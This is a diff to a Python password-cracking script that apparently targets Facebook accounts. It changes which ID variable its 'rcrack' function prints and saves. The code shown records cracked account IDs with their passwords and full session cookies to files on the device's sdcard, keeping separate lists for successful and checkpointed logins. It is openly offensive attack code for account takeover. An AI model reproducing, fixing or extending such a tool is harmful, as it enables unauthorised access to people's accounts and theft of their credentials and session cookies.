@@ -408,16 +408,16 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                print(' MARWAN-OK  '+uid+'| '+ps+' \n''[\033[1;34mCOOKIES🍪\033[1;37m] : \33[1;97m'+coki+'\n')
+                print(' MARWAN-OK  '+cid+'| '+ps+' \n''[\033[1;34mCOOKIES🍪\033[1;37m] : \33[1;97m'+coki+'\n')
                 cek_apk(session,coki)
-                open('/sdcard/MARWAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/MARWAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[24:39]
-                print(' \x1b[38;5;208m[MARWAN-CPm] '+uid+' | '+ps+'\033[0;97m')
-                open('/sdcard/MARWAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(' \x1b[38;5;208m[MARWAN-CPm] '+cid+' | '+ps+'\033[0;97m')
+                open('/sdcard/MARWAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
